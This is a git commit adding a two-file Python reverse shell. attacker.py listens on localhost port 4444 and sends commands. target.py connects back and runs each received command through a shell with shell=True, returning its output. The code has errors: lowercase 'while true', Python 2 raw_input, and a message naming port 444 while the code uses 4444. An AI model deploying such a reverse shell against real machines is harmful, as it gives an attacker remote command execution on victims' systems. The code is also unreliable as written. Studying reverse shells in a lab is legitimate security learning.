bb3d8c0699632494944883cd9fcb4067d7bd82f5
ThomasBucaioni <thomas.bucaioni@gmail.com>
2023-05-14 10:35:25 +0200

    Add reverse shell

---
+++ rshell/attacker.py
@@ -0,0 +1,27 @@
+import socket
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("127.0.0.1", 4444))
+    s.listen(1)
+
+    print('-- Listening on port 444')
+
+    conn, addr = s.accept()
+
+    print('-- Connection accepted from', addr)
+
+    while true:
+        command = raw_input("cmd_prompt> ")
+        if 'terminate' in command:
+            conn.send('terminate')
+            conn.close()
+            break
+        else:
+            conn.send(command)
+            print(conn.recv(1024))
+
+def main():
+    connect()
+
+main()
---
+++ rshell/target.py
@@ -0,0 +1,24 @@
+import socket
+import subprocess
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('127.0.0.1', 4444))
+
+    while True:
+        command = s.recv(1024)
+
+        if 'terminate' in command:
+            s.close()
+            break
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
+
+def main():
+    connect()
+
+main()
+
+
